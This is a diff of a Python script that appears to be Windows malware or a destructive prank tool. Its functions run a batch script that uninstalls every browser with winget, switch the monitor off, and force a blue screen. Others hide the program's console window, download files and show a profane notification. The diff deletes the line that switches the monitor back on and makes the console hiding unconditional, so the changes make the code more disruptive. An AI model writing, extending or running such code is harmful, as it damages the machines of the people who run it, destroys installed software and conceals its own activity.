@@ -14,7 +14,6 @@ import urllib.request
 
 class objects:
     def getAllUnifiedObjectsAndDelete():
-        print("ALL UNIFIED OBJECTS AND DELETE")
         os.system("""@echo off
         REM Uninstall all browsers using winget
         echo Uninstalling all browsers...
@@ -77,7 +76,7 @@ def getOwnerShip(path):
         return str(e)
     
 
-def makeBuggyScreen(): # THIS IS VERY BAD, DO NOT USE IT IF YOU ARE NOT SURE.
+def StopMonitor(): # THIS IS VERY BAD, DO NOT USE IT IF YOU ARE NOT SURE.
     # Definir constantes
     HWND_BROADCAST = 0xFFFF
     WM_SYSCOMMAND = 0x0112
@@ -90,9 +89,6 @@ def makeBuggyScreen(): # THIS IS VERY BAD, DO NOT USE IT IF YOU ARE NOT SURE.
 
     # Apagar pantalla
     ctypes.windll.user32.PostMessageW(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, MONITOR_OFF)
-
-    # Encender pantalla
-    ctypes.windll.user32.PostMessageW(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, MONITOR_ON)
 
 
 def ShowFuckNotification(title, message):
@@ -120,11 +116,10 @@ def MakeBSOD():
     )
 
 def HideConsole():
-    kernel32 = ctypes.WinDLL("kernel32")
+    kernel32 = ctypes.WinDLL('kernel32')
+    user32 = ctypes.WinDLL('user32')
     hWnd = kernel32.GetConsoleWindow()
-    if hWnd:
-        user32 = ctypes.WinDLL("user32")
-        user32.ShowWindow(hWnd, 0)
+    user32.ShowWindow(hWnd, 0)
 
 
 def DownloadFile(url):
